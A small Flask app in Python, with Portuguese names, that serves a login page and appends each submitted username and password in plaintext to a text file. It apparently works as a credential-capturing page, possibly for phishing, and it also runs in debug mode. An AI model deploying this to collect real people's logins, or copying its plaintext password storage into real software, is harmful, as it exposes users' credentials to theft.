from flask import Flask,render_template,request,url_for

app = Flask(__name__)

@app.route("/")
def home():
    telaInicial = render_template("index.html")
    return telaInicial

@app.route("/login")
def login():
    telaLogin = render_template("login.html")
    return telaLogin
    
@app.route("/resultado",methods=["GET","POST"])
def resultado():
    user = request.form["usuario"]
    senha = request.form["senha"]
    
    with open("dados.txt","a") as f:
        f.write("___"*10)
        f.write("\n")
        f.write(f"Nome: {user} \n")
        f.write(f"Senha: {senha} \n")
        f.write("___"*10)
        
        usuario = f"Email: {user}"
    return render_template("resultado.html",usuario=usuario)
    
if __name__ == "__main__":
    app.run(debug=True)    